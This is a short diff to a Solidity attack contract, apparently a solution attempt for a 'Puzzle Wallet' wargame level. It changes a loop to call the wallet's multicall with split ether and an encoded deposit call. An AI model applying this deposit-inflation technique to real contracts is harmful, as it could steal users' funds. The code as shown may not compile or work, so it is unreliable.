@@ -40,8 +40,11 @@ contract PuzzleAttack {
 
     function puzzleMulticall() public payable {
         uint256 times = 30;
+        uint256 val = msg.value / 30;
+        bytes memory data = abi.encodeWithSignature("deposit()");
+
         for (uint256 i = 0; i < times; i++) {
-            puzzleWallet.multicall([]);
+            puzzleWallet.multicall{value: val}(data);
         }
     }
 }
